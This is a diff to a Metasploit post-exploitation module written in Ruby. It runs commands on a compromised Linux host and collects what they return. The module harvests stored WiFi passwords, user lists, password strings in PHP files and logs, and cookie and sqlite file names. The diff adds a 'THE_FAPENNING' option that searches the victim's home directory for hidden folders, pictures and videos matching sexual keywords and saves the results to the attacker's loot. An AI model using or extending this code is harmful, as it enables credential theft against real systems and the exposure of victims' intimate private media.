@@ -21,11 +21,12 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on => set SESSION 3
-# Store dumped data to msf4/loot folder?   => set STORE_LOOT true
-# Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
-# Dump remote credentials from target?     => set CREDENTIALS_DUMP true
-# The bash command to execute remotly      => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
+# The session number to run this module on     => set SESSION 3
+# Store dumped data to msf4/loot folder?       => set STORE_LOOT true
+# Agressive system fingerprints scan?          => set AGRESSIVE_DUMP true
+# Dump remote credentials from target?         => set CREDENTIALS_DUMP true
+# list hidden folders/pics/vids porn related?' => set THE_FAPENNING true
+# The bash command to execute remotly          => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -134,6 +135,7 @@ class MetasploitModule < Msf::Post
                         [
                                 OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
                                 OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
+                                OptBool.new('THE_FAPENNING', [false, 'list hidden folders/pics/vids porn related?', false]),
                                 OptString.new('SINGLE_COMMAND', [false, 'Input one bash command to be executed remotely'])
                         ], self.class)
  
@@ -266,7 +268,7 @@ def run
             data_dump << "System language     : pt_PT\n"
           else
             data_dump << "System language     : #{system_lang}\n"
-           end
+          end
         data_dump << "Sudo version        : #{sudo_version}\n"
         data_dump << "Bash version        : #{sh_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
@@ -417,9 +419,8 @@ def run
           #
           # bash commands to be executed remotely ..
           #
-          # dump cookies
-          list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
-          list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
+          # dump cookies file names from target
+          list_cookies = cmd_exec("ls -a -R ~/ | egrep -i 'sqlite|cookie'")
           # Dump target WIFI credentials stored ..
           wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
           wep_out = cmd_exec("grep wep-key0= /etc/NetworkManager/system-connections/*")
@@ -430,10 +431,10 @@ def run
           uuid_id = cmd_exec("for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done")
           # find php var password strings
           php_passwd = cmd_exec("find / -name \"*.php\" -print0 | xargs -0 grep -i -n \"var password\"")
-          # Check log files for keywords (pass|user|passphrase) and show positive matches (full paths)
+          # Check log files for keywords (pass|passwd|password) and show positive matches (full paths)
           log_auth = cmd_exec("egrep -l -i 'pass|passwd|password|passphrase' /var/log/*.log")
           # search inside auth.log for (pass|passwd|password) strings and present results
-          search_pass = cmd_exec("cat /var/log/auth.log | egrep -i \"pass|passwd|password\"")
+          search_pass = cmd_exec("cat /var/log/auth.log | egrep -i 'pass|passwd|password'")
             #
             # store data into a local variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
@@ -480,7 +481,51 @@ def run
             data_dump << "-----------------\n"
             data_dump << list_cookies
             data_dump << "\n\n"
-            data_dump << list_sqlite
+        end
+
+
+
+        #
+        # Run agressive scans againts target ..
+        # if sellected previous in advanced options (set THE_FAPENNING true) ..
+        #
+        if datastore['THE_FAPENNING'] == true
+          print_status("List remote folders/files porn related ..")
+          Rex::sleep(0.2)
+          # clean local variables to accept new data inputs
+          fap_dir=''
+          fap_pic=''
+          fap_vid=''
+          #
+          # bash commands to be executed remotely ..
+          #
+          if system_lang =~ /C/ || system_lang =~ /'C'/ || system_lang =~ /pt_PT/
+            fap_dir = cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|porn|xxx\"`; locate $di")
+            fap_pic = cmd_exec("pi=`ls -ABR ~/Imagens | grep \"^\\.\" | egrep -i \".png|.jpg|.jpeg\"`; locate $pi")
+            fap_vid = cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.webm\"")
+          else
+            cmd_exec("di=`ls -ApR ~/ | egrep \"^\\..*/$\" | egrep -iw \"sex|sexy|hot|horny|teens|fuck|girls|nude|nudes|naked|porn|xxx\"`; locate $di")
+            cmd_exec("pi=`ls -ABR ~/Images | grep \"^\\.\" | egrep -i \".png|.jpg|.jpeg\"`; locate $pi")
+            cmd_exec("ls -ABR ~/ | grep \"^\\.\" | egrep -i \".ogv|.mp4|.webm\"")
+          end
+            #
+            # store data into a local variable (data_dump) ..
+            # to be able to write the logfile and display the outputs ..
+            #
+            print_status("Storing scan results into msf database ..")
+            Rex::sleep(0.7)
+            data_dump << "+--------------------------------+\n"
+            data_dump << "|         The Fapenning          |\n"
+            data_dump << "+--------------------------------+\n"
+            data_dump << "\n\n"
+            data_dump << "HIDDEN DIRECTORYS FOUND:\n"
+            data_dump << fap_dir
+            data_dump << "\n\n"
+            data_dump << "HIDDEN PICTURES FOUND:\n"
+            data_dump << fap_pic
+            data_dump << "\n\n"
+            data_dump << "HIDDEN VIDEOS FOUND:\n"
+            data_dump << fap_vid
             data_dump << "\n\n"
         end
 
@@ -511,7 +556,6 @@ def run
             data_dump << single_comm
             data_dump << "\n\n"
         end
-
 
 
        #
